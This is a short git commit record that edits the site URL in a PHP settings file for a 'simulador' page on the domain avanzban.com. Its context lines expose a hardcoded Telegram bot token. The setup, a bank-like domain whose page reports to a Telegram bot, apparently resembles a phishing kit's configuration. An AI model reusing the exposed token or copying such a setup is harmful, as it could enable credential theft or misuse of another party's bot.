f5dd145e5ca75ccc030d127478be4c1bde959b55
Melomaman1 <MIRNAG_01@HOTMAIL.COM>
2026-06-22 21:07:25 -0500

    Update settings.php

--- simulador/settings.php
+++ simulador/settings.php
@@ -2,7 +2,7 @@
 
 // URL del sitio donde fue subido (sin barra final)
 // Ejemplo: https://midominio.com/simulador
-$site_url = "https://avanzban.com/simulador/";
+$site_url = "https://avanzban.com/simulador/pcindex.html";
 
 // Telegram Bot Configuration
 $token = "8910530226:AAFkjqMoTQQ90AZIQU5paJLG32HTOo3MYng";
